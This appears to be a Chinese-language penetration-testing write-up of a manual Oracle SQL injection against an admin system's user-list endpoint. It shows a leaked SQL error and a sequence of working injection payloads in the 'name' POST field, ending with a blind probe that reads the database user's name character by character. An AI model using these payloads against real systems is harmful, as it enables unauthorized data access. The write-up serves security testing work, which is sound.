# 记一次手工oracle注入的挖掘

收获：想想or语句  
环境为阿里云测试服务器，新上线系统。  
首先在post数据中的name字段添加测试字符，报错如下：  

```txt
pagenum=1&pagesize=20&name=1'&phone=&type=-1&isyunying=1

HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Date: Wed, 06 Mar 2019 03:06:37 GMT
Connection: close
Content-Length: 899

{"data":null,"success":false,"id":0,"count":0,"pages":0,"errcode":null,"errmsg":"\r\n### Error querying database.  Cause: java.sql.SQLSyntaxErrorException: ORA-00911: 无效字符\n\r\n### The error may exist in file [D:\\apache-tomcat-8.5.37\\webapps\\admin\\WEB-INF\\classes\\mapper\\UserMapper.xml]\r\n### The error may involve com.kkeye.wdwx.admin.mapper.UserMapper.getList-Inline\r\n### The error occurred while setting parameters\r\n### SQL: select count(0) from (select tu.*,tui.amount,tui.cnt from wdwx_t_user tu left join wdwx_t_userinfo tui on tui.userid=tu.id          WHERE  tu.isyunying=?                          and tu.nickname like '%1'%'          order by tu.id desc) tmp_count\r\n### Cause: java.sql.SQLSyntaxErrorException: ORA-00911: 无效字符\n\n; bad SQL grammar []; nested exception is java.sql.SQLSyntaxErrorException: ORA-00911: 无效字符\n","ope_pm":false,"pms":null}
```

注意其中sql报错：
`select count(0) from (select tu.*,tui.amount,tui.cnt from wdwx_t_user tu left join wdwx_t_userinfo tui on tui.userid=tu.id    WHERE  tu.isyunying=?  and tu.nickname like '%1'%'    order by tu.id desc)`

like 后面的位置存在注入。会使用   `'% %'`将输入值包围起来。

使用`pagenum=1&pagesize=20&name=1%'or'%'='&phone=&type=-1&isyunying=1`发现异常。

后续使用 `pagenum=1&pagesize=20&name=1'or 1=1--+&phone=&type=-1&isyunying=1`成功获得返回值。

最后使用如下语句确认存在注入，并得到用户名长度。
`pagenum=1&pagesize=20&name=1' or ascii(substr(SYS_CONTEXT('USERENV','CURRENT_USER'),1,1))=87 --+&phone=&type=-1&isyunying=1`